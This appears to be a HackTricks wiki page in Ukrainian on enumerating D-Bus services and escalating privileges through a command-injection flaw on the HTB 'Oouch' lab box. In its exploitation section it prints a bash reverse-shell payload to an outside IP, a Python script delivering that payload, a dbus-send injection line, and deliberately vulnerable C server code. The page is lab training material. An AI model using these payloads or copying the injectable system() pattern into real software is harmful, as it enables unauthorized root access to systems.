# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus використовується як посередник міжпроцесорних комунікацій (IPC) в середовищах робочого столу Ubuntu. В Ubuntu спостерігається одночасна робота кількох шини повідомлень: системна шина, яка в основному використовується **привілейованими службами для відкриття служб, що мають відношення до системи**, та сесійна шина для кожного увійшовшого користувача, яка відкриває служби, що мають відношення лише до цього конкретного користувача. Основна увага тут зосереджена на системній шині через її асоціацію з службами, що працюють з вищими привілеями (наприклад, root), оскільки наша мета - підвищити привілеї. Зазначається, що архітектура D-Bus використовує 'маршрутизатор' для кожної сесійної шини, який відповідає за перенаправлення повідомлень клієнтів до відповідних служб на основі адреси, вказаної клієнтами для служби, з якою вони бажають спілкуватися.

Служби на D-Bus визначаються **об'єктами** та **інтерфейсами**, які вони відкривають. Об'єкти можна порівняти з екземплярами класів у стандартних мовах ООП, при цьому кожен екземпляр унікально ідентифікується **шляхом об'єкта**. Цей шлях, подібно до шляху файлової системи, унікально ідентифікує кожен об'єкт, відкритий службою. Ключовим інтерфейсом для дослідження є інтерфейс **org.freedesktop.DBus.Introspectable**, який має єдиний метод, Introspect. Цей метод повертає XML-представлення підтримуваних методів, сигналів та властивостей об'єкта, зосереджуючи увагу на методах, пропускаючи властивості та сигнали.

Для зв'язку з інтерфейсом D-Bus було використано два інструменти: CLI-інструмент під назвою **gdbus** для легкого виклику методів, відкритих D-Bus у скриптах, та [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), графічний інструмент на основі Python, призначений для перерахунку служб, доступних на кожній шині, та для відображення об'єктів, що містяться в кожній службі.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


У першому зображенні показані сервіси, зареєстровані в системній шині D-Bus, з **org.debin.apt**, зокрема, виділеним після вибору кнопки System Bus. D-Feet запитує цей сервіс на предмет об'єктів, відображаючи інтерфейси, методи, властивості та сигнали для вибраних об'єктів, що видно на другому зображенні. Також детально описується підпис кожного методу.

Помітною особливістю є відображення **ідентифікатора процесу (pid)** та **командного рядка** сервісу, що корисно для підтвердження, чи працює сервіс з підвищеними привілеями, що важливо для дослідження.

**D-Feet також дозволяє виклик методів**: користувачі можуть вводити вирази Python як параметри, які D-Feet перетворює на типи D-Bus перед передачею сервісу.

Однак слід зазначити, що **деякі методи вимагають аутентифікації** перед тим, як дозволити їх виклик. Ми проігноруємо ці методи, оскільки наша мета - підвищити наші привілеї без облікових даних з самого початку.

Також зверніть увагу, що деякі з сервісів запитують інший сервіс D-Bus під назвою org.freedeskto.PolicyKit1, чи слід дозволити користувачу виконувати певні дії чи ні.

## **Cmd line Enumeration**

### Список об'єктів сервісу

Можливо перерахувати відкриті інтерфейси D-Bus за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[З Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Коли процес встановлює з'єднання з шиною, шина призначає з'єднанню спеціальну назву шини, звану _унікальною назвою з'єднання_. Назви шин цього типу є незмінними — гарантовано, що вони не зміняться, поки з'єднання існує — і, що більш важливо, їх не можна повторно використовувати протягом життєвого циклу шини. Це означає, що жодне інше з'єднання з цією шиною ніколи не отримає таку унікальну назву з'єднання, навіть якщо той самий процес закриває з'єднання з шиною і створює нове. Унікальні назви з'єднань легко впізнавані, оскільки вони починаються з — в іншому випадку забороненого — символу двокрапки.

### Service Object Info

Тоді ви можете отримати деяку інформацію про інтерфейс за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

Вам потрібно мати достатньо прав.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Зверніть увагу, що в цьому прикладі була обрана остання виявлена інтерфейс за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (той, що нас цікавить). "s" в інших стовпцях може означати, що очікується рядок.

### Інтерфейс моніторингу/захоплення

З достатніми привілеями (лише привілеїв `send_destination` та `receive_sender` недостатньо) ви можете **моніторити D-Bus комунікацію**.

Щоб **моніторити** **комунікацію**, вам потрібно бути **root.** Якщо у вас все ще виникають проблеми з правами root, перевірте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) та [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Якщо ви знаєте, як налаштувати конфігураційний файл D-Bus, щоб **дозволити не root користувачам перехоплювати** комунікацію, будь ласка, **зв'яжіться зі мною**!
{% endhint %}

Різні способи моніторингу:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наступному прикладі інтерфейс `htb.oouch.Block` моніториться, і **повідомлення "**_**lalalalal**_**" надсилається через непорозуміння**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Ви можете використовувати `capture` замість `monitor`, щоб зберегти результати у файлі pcap.

#### Фільтрація всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо на шині занадто багато інформації, передайте правило збігу так:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Багато правил можуть бути вказані. Якщо повідомлення відповідає _будь-якому_ з правил, повідомлення буде надруковано. Ось так:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Дивіться [документацію D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) для отримання додаткової інформації про синтаксис правил відповідності.

### Більше

`busctl` має ще більше опцій, [**знайдіть усі з них тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий сценарій**

Як користувач **qtc всередині хоста "oouch" з HTB** ви можете знайти **неочікуваний конфігураційний файл D-Bus**, розташований у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Зверніть увагу на попередню конфігурацію, що **вам потрібно бути користувачем `root` або `www-data`, щоб надсилати та отримувати інформацію** через цю D-BUS комунікацію.

Як користувач **qtc** всередині контейнера docker **aeb4525789d8** ви можете знайти деякий код, пов'язаний з dbus, у файлі _/code/oouch/routes.py._ Це цікавий код:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як ви можете бачити, це **підключається до інтерфейсу D-Bus** і надсилає до **функції "Block"** "client\_ip".

На іншій стороні з'єднання D-Bus працює деякий скомпільований C-бінарник. Цей код **слухає** з'єднання D-Bus **для IP-адреси і викликає iptables через функцію `system`** для блокування заданої IP-адреси.\
**Виклик `system` навмисно вразливий до ін'єкцій команд**, тому такий корисний вантаж, як наступний, створить зворотне з'єднання: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Використайте це

В кінці цієї сторінки ви можете знайти **повний C-код програми D-Bus**. Всередині ви можете знайти між рядками 91-97 **як `D-Bus object path`** **та `interface name`** **реєструються**. Ця інформація буде необхідна для надсилання інформації до з'єднання D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також, у рядку 57 ви можете знайти, що **єдиний метод, зареєстрований** для цього D-Bus зв'язку називається `Block`(_**Ось чому в наступному розділі корисні навантаження будуть надіслані до об'єкта служби `htb.oouch.Block`, інтерфейсу `/htb/oouch/Block` та назви методу `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наступний код на python надішле корисне навантаження до з'єднання D-Bus до методу `Block` через `block_iface.Block(runme)` (_зауважте, що він був витягнутий з попереднього фрагмента коду_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl та dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` - це інструмент, який використовується для відправки повідомлень до “Message Bus”
* Message Bus – програмне забезпечення, яке використовується системами для спрощення комунікації між додатками. Це пов'язано з Message Queue (повідомлення впорядковані в послідовності), але в Message Bus повідомлення надсилаються за моделлю підписки і також дуже швидко.
* Тег “-system” використовується для позначення того, що це системне повідомлення, а не повідомлення сесії (за замовчуванням).
* Тег “–print-reply” використовується для належного виведення нашого повідомлення та отримання будь-яких відповідей у зрозумілому для людини форматі.
* “–dest=Dbus-Interface-Block” Адреса інтерфейсу Dbus.
* “–string:” – тип повідомлення, яке ми хочемо надіслати до інтерфейсу. Існує кілька форматів для відправки повідомлень, таких як double, bytes, booleans, int, objpath. З цього, “object path” корисний, коли ми хочемо надіслати шлях до файлу до інтерфейсу Dbus. У цьому випадку ми можемо використовувати спеціальний файл (FIFO), щоб передати команду до інтерфейсу під ім'ям файлу. “string:;” – це для повторного виклику об'єктного шляху, де ми розміщуємо файл/команду зворотного шелу FIFO.

_Зверніть увагу, що в `htb.oouch.Block.Block`, перша частина (`htb.oouch.Block`) посилається на об'єкт служби, а остання частина (`.Block`) посилається на назву методу._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Посилання
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
